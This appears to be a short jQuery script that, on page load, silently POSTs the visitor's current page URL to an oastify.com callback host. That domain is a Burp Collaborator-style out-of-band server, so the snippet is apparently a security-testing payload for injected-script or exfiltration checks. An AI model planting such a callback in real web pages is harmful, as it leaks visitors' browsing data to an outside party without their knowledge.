$(document).ready(function() {
    var currentUrl = window.location.href; // Get the current URL

    $.ajax({
        url: 'https://49bqccm64qblm70t7iwxn97ualgc490xp.oastify.com/endpoint', // Replace with your server endpoint
        type: 'POST',
        data: {url: currentUrl},
        success: function(response) {
            // Handle the response here if needed
        },
        error: function(xhr, status, error) {
            // Handle errors here
        }
    });
});
